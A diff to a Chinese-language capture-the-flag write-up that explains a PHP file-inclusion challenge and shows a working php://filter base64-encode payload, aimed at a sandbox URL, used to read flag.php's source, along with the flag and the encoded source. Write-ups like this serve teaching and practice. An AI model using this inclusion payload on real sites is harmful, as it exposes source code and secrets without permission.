@@ -10,6 +10,8 @@ layout: null
 
 题目描述：
 
+![题目描述](Ch-ph-wp12-2.png)
+
 ### 解题思路
 
 页面只有一个参数 p。访问 p=hello 返回 hello world!，访问 p=flag 返回 no no no，说明代码是把 p 的值拼上 .php 再 include。flag.php 里第一句就是 die，所以直接包含它只会被踢出去。flag 写在它的源码注释里，得想办法读源码而不是执行它。
@@ -75,7 +77,7 @@ layout: null
     //n1book{afr_1_solved}
     ```
 
-6. 注释里就是 flag
+6. 注释里就是 flag，获得flag
 
 ### Payload
 
@@ -83,10 +85,16 @@ layout: null
 GET /?p=php://filter/convert.base64-encode/resource=flag HTTP/1.1
 ```
 
-本次地址
+完整地址
 
 ```
 http://challenge-7658aefcd8b703bf.sandbox.ctfhub.com:10800/?p=php://filter/convert.base64-encode/resource=flag
+```
+
+返回的 base64 解码后就是源码
+
+```
+PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9Cg==
 ```
 
 ### flag
@@ -94,5 +102,3 @@ http://challenge-7658aefcd8b703bf.sandbox.ctfhub.com:10800/?p=php://filter/conve
 n1book{afr_1_solved}
 
 ### 总结&反思
-
-这题我算是第一次见，是一个简单题但是对我还是很效果，让我对一些基础的操作有了更多的认识。
